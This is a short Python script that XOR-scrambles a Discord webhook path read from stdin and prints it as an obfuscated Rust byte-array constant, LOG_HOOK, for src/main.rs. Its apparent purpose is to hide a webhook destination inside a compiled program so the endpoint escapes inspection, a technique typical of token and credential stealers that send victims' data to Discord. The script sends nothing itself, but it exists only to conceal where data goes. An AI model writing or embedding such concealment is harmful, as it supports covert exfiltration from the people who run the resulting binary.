# Prints the scrambled LOG_HOOK array for src/main.rs from a webhook URL on stdin.
import sys
u = sys.stdin.read().strip()
p = u.split("discord.com", 1)[1] if "discord.com" in u else u
b = [ord(c) ^ (0x5A ^ ((i * 29) & 0xFF)) for i, c in enumerate(p)]
print("const LOG_HOOK: &[u8] = &[" + ", ".join(map(str, b)) + "];")
